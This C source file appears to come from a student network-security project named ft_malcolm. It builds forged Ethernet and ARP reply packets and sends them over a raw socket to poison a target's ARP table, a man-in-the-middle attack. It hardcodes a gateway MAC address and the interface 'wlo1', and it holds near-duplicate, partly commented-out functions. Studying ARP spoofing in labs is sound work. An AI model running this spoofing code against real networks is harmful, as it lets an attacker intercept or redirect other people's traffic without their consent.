#include "ft_malcolm.h"

/*
Ethernet Header
  |- Destination MAC Address
  |- Source MAC Address
  |- EtherType (ARP: 0x0806)

ARP Header
  |- Hardware Type (Ethernet: 1)
  |- Protocol Type (IPv4: 0x0800)
  |- Hardware Address Length (MAC address length: 6)
  |- Protocol Address Length (IPv4 address length: 4)
  |- Operation (ARP Reply: 2)
  |- Sender MAC Address
  |- Sender IP Address
  |- Target MAC Address
  |- Target IP Address

Payload (if any)
*/

void    _mc_create_packet_for_spoofing2(void)
{
    // Modify the Ethernet header
    struct ethhdr *eth = (struct ethhdr *)_mc_g_data.packet;
    /* Spoofing the ethernet header */

    uint8_t gateway_mac[6];
    _mc_convert_mac_string_to_bytes("cc:fd:17:a6:cc:44 ", gateway_mac);

    // The destination MAC is set to the target's MAC address
	_mc_memcpy(eth->h_dest, _mc_g_data.target_mac, ETH_ALEN);
    // The source MAC is falsly set to the host's MAC address
	_mc_memcpy(eth->h_source, _mc_g_data.host_mac, ETH_ALEN);

    printf("Ethernet header:\n");
    printf("h_dest: ");_mc_print_mac(eth->h_dest);
	printf("h_src: "); _mc_print_mac(eth->h_source);
}

void    _mc_create_packet_for_spoofing(void)
{
    // Modify the Ethernet header
    struct ethhdr *eth = (struct ethhdr *)_mc_g_data.packet;
    /* Spoofing the ethernet header */

    uint8_t gateway_mac[6];
    _mc_convert_mac_string_to_bytes("cc:fd:17:a6:cc:44 ", gateway_mac);

    // The destination MAC is set to the target's MAC address
	_mc_memcpy(eth->h_dest, gateway_mac, ETH_ALEN);
    // The source MAC is falsly set to the host's MAC address
	_mc_memcpy(eth->h_source, _mc_g_data.host_mac, ETH_ALEN);

    printf("Ethernet header:\n");
    printf("h_dest: ");_mc_print_mac(eth->h_dest);
	printf("h_src: "); _mc_print_mac(eth->h_source);
}

void	_mc_run_arp_spoofing(void)
{
	_mc_create_packet_for_spoofing();
    // struct ethhdr *eth = (struct ethhdr *)_mc_g_data.packet;

    // // Initialize the source address structure
    // memset(&_mc_g_data.src_addr, 0, sizeof(_mc_g_data.src_addr));
    // _mc_g_data.src_addr.sll_family = AF_PACKET;
    // _mc_g_data.src_addr.sll_ifindex = if_nametoindex("wlo1"); // Use your network interface
    // if (_mc_g_data.src_addr.sll_ifindex == 0)
    // {
    //     perror("if_nametoindex failed");
    //     exit(EXIT_FAILURE);
    // }

    // _mc_g_data.src_addr.sll_halen = ETH_ALEN;
    // memcpy(_mc_g_data.src_addr.sll_addr, eth->h_dest, ETH_ALEN);

    /* Send the fake ARP reply using the custom packet
        (Destination port is inside src_addr) */
    printf(_MC_YELLOW_COLOR
        ">> Now sending an ARP reply to the target address with spoofed source <<"
        _MC_RESET_COLOR "\n\n"
    );

    int ret = sendto(
        _mc_g_data.raw_sockfd, _mc_g_data.packet, sizeof(_mc_t_packet), 0,
        (struct sockaddr *)&_mc_g_data.src_addr, sizeof(struct sockaddr_ll)
    );

    if (ret <= 0) fprintf(stderr, _MC_RED_CROSS "Failed to send the ARP reply\n");
    else
        printf("\nSent an ARP reply packet, you may now check the arp table on the target\n");
}

void	_mc_run_arp_spoofing2(void)
{
	_mc_create_packet_for_spoofing2();
    struct ethhdr *eth = (struct ethhdr *)_mc_g_data.packet;

    // Initialize the source address structure
    memset(&_mc_g_data.src_addr, 0, sizeof(_mc_g_data.src_addr));
    _mc_g_data.src_addr.sll_family = AF_PACKET;
    _mc_g_data.src_addr.sll_ifindex = if_nametoindex("wlo1"); // Use your network interface
    if (_mc_g_data.src_addr.sll_ifindex == 0)
    {
        perror("if_nametoindex failed");
        exit(EXIT_FAILURE);
    }

    _mc_g_data.src_addr.sll_halen = ETH_ALEN;
    memcpy(_mc_g_data.src_addr.sll_addr, eth->h_dest, ETH_ALEN);


    /* Send the fake ARP reply using the custom packet
        (Destination port is inside src_addr) */
    printf(_MC_YELLOW_COLOR
        ">> Now sending an ARP reply to the target address with spoofed source <<"
        _MC_RESET_COLOR "\n\n"
    );

    int ret = sendto(
        _mc_g_data.raw_sockfd, _mc_g_data.packet, sizeof(_mc_t_packet), 0,
        (struct sockaddr *)&_mc_g_data.src_addr, sizeof(struct sockaddr_ll)
    );

    if (ret <= 0) fprintf(stderr, _MC_RED_CROSS "Failed to send the ARP reply\n");
    else
        printf("\nSent an ARP reply packet, you may now check the arp table on the target\n");
}